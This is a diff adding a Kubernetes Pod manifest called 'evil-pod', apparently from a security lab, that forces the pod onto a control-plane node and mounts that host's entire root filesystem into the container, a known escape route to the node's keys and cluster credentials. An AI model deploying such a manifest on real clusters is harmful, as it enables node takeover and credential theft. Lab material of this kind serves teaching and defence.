@@ -1,0 +1,30 @@
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: evil-pod
+  namespace: pls-dont-hack-me
+  labels:
+    app: evil-pod
+spec:
+  containers:
+  - name: evil-pod
+    image: ubuntu
+    resources:
+      requests:
+        memory: "64Mi"
+        cpu: "250m"
+      limits:
+        memory: "256Mi"
+        cpu: "500m"
+    volumeMounts: # Mount that host path volume below, under /controlplane inside the pod's container
+    - mountPath: /controlplane
+      name: noderoot 
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  nodeName: lab-control-plane # Forces pod to run on control-plane node
+  volumes:
+  - name: noderoot # Creates a volume that mounts the host's root directory
+    hostPath:
+      path: /
+  
